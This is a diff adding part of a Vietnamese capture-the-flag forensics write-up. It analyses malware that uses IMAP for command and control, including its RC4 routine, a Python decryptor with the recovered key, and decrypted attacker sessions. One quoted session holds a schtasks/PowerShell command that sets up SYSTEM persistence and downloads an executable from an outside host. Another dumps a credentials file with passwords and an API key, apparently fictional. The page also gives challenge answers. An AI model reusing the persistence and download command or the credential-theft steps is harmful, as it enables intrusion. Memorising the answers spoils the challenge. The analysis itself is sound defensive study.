@@ -145,3 +145,167 @@ Tiếp theo là hàm mã hóa xor
 Hàm sử dụng một mảng byte cố định gồm 256 phần tử làm khóa (key)
 
 Đến đây là mình bị stuck, vì ban đầu mình nghĩ thì chỉ là xor giữa key và data xong base64 encrypt thông thường nhưng thử rất nhiều script giải mã mà kh cho ra kết quả mong muốn
+
+Nhìn kĩ lại thì thấy ban đầu hàm return Exor.encrypt, giờ mình sẽ đi tìm hàm Exor xem nó làm gì
+
+```C#
+namespace imap_chanel
+{
+  public class Exor
+  {
+    public static byte[] Encrypt(byte[] pwd, byte[] data)
+    {
+      int[] numArray1 = new int[256];
+      int[] numArray2 = new int[256];
+      byte[] numArray3 = new byte[data.Length];
+      for (int index = 0; index < 256; ++index)
+      {
+        numArray1[index] = (int) pwd[index % pwd.Length];
+        numArray2[index] = index;
+      }
+      int index1;
+      for (int index2 = index1 = 0; index1 < 256; ++index1)
+      {
+        index2 = (index2 + numArray2[index1] + numArray1[index1]) % 256;
+        int num = numArray2[index1];
+        numArray2[index1] = numArray2[index2];
+        numArray2[index2] = num;
+      }
+      int num1;
+      int index3 = num1 = 0;
+      int index4 = num1;
+      int index5 = num1;
+      for (; index3 < data.Length; ++index3)
+      {
+        index5 = (index5 + 1) % 256;
+        index4 = (index4 + numArray2[index5]) % 256;
+        int num2 = numArray2[index5];
+        numArray2[index5] = numArray2[index4];
+        numArray2[index4] = num2;
+        int num3 = numArray2[(numArray2[index5] + numArray2[index4]) % 256];
+        numArray3[index3] = (byte) ((uint) data[index3] ^ (uint) num3);
+      }
+      return numArray3;
+    }
+  }
+}
+```
+Đoạn mã trên thực hiện mã hóa RC4, Nó nhận vào một mảng byte pwd (khóa) và một mảng byte data (dữ liệu cần mã hóa), sau đó trả về dữ liệu đã được mã hóa dưới dạng mảng byte
+
+Đến đây đã xác định được kiểu mã hóa cho đoạn email được gửi đi:
+- RC4 tạo keystream
+- Xor keystream với data
+- Base64 encrypt
+
+Giờ sẽ làm ngược lại và nhờ AI viết để decrypt
+
+```Python
+import base64
+
+def rc4(key, data):
+    S = list(range(256))
+    j = 0
+    out = bytearray()
+    for i in range(256):
+        j = (j + S[i] + key[i % len(key)]) % 256
+        S[i], S[j] = S[j], S[i]
+    i = j = 0
+    for byte in data:
+        i = (i + 1) % 256
+        j = (j + S[i]) % 256
+        S[i], S[j] = S[j], S[i]
+        out.append(byte ^ S[(S[i] + S[j]) % 256])
+    return bytes(out)
+
+# Khóa RC4 từ mảng byte bạn cung cấp
+key = bytes([
+    168, 115, 174, 213, 168, 222, 72, 36, 91, 209, 242, 128, 69, 99, 195, 164,
+    238, 182, 67, 92, 7, 121, 164, 86, 121, 10, 93, 4, 140, 111, 248, 44,
+    30, 94, 48, 54, 45, 100, 184, 54, 28, 82, 201, 188, 203, 150, 123, 163,
+    229, 138, 177, 51, 164, 232, 86, 154, 179, 143, 144, 22, 134, 12, 40, 243,
+    55, 2, 73, 103, 99, 243, 236, 119, 9, 120, 247, 25, 132, 137, 67, 66,
+    111, 240, 108, 86, 85, 63, 44, 49, 241, 6, 3, 170, 131, 150, 53, 49,
+    126, 72, 60, 36, 144, 248, 55, 10, 241, 208, 163, 217, 49, 154, 206, 227,
+    25, 99, 18, 144, 134, 169, 237, 100, 117, 22, 11, 150, 157, 230, 173, 38,
+    72, 99, 129, 30, 220, 112, 226, 56, 16, 114, 133, 22, 96, 1, 90, 72,
+    162, 38, 143, 186, 35, 142, 128, 234, 196, 239, 134, 178, 205, 229, 121, 225,
+    246, 232, 205, 236, 254, 152, 145, 98, 126, 29, 217, 74, 177, 142, 19, 190,
+    182, 151, 233, 157, 76, 74, 104, 155, 79, 115, 5, 18, 204, 65, 254, 204,
+    118, 71, 92, 33, 58, 112, 206, 151, 103, 179, 24, 164, 219, 98, 81, 6,
+    241, 100, 228, 190, 96, 140, 128, 1, 161, 246, 236, 25, 62, 100, 87, 145,
+    185, 45, 61, 143, 52, 8, 227, 32, 233, 37, 183, 101, 89, 24, 125, 203,
+    227, 9, 146, 156, 208, 206, 194, 134, 194, 23, 233, 100, 38, 158, 58, 159
+])
+
+# Dữ liệu Base64 cần giải mã
+b64_data = """
+
+"""
+
+# Giải mã
+data = base64.b64decode(b64_data)
+decrypted = rc4(key, data)
+print(decrypted.decode(errors="ignore"))
+```
+
+Data sẽ được lấy từ imap trong wireshark
+
+Ở luồng tcp.stream 35 sẽ lấy được đáp án
+
+Microsoft Windows [Version 10.0.19045.5487]
+```
+(c) Microsoft Corporation. All rights reserved.
+
+
+
+C:\Users\dev-support\Desktop>schtasks /create /tn Synchronization /tr "powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://www.mediafire.com/view/wlq9mlfrl0nlcuk/rakalam.exe/file -OutFile C:\Temp\rakalam.exe" /sc minute /mo 1 /ru SYSTEM
+
+
+
+C:\Users\dev-support\Desktop>
+```
+
+```
+Answer: Synchronization
+```
+> 6. What is the API key leaked from the highly valuable file discovered by the attacker?
+
+Vẫn tiếp tục là lấy data đem decode, thì ở stream 97 sẽ có được đáp án
+
+```
+Microsoft Windows [Version 10.0.19045.5487]
+
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Users\dev-support\Desktop>more C:\backups\credentials.txt
+
+[Database Server]
+
+host=db.internal.korptech.net
+
+username=dbadmin
+
+password=rY?ZY_65P4V0
+
+[Game API]
+
+host=api.korptech.net
+
+api_key=sk-3498fwe09r8fw3f98fw9832fw
+
+[SSH Access]
+
+host=dev-build.korptech.net
+
+username=devops
+
+password=BuildServer@92|7Gy1lz'Xb
+
+port=2022
+
+C:\Users\dev-support\Desktop>
+```
+
+```
+Answer: sk-3498fwe09r8fw3f98fw9832fw
+```
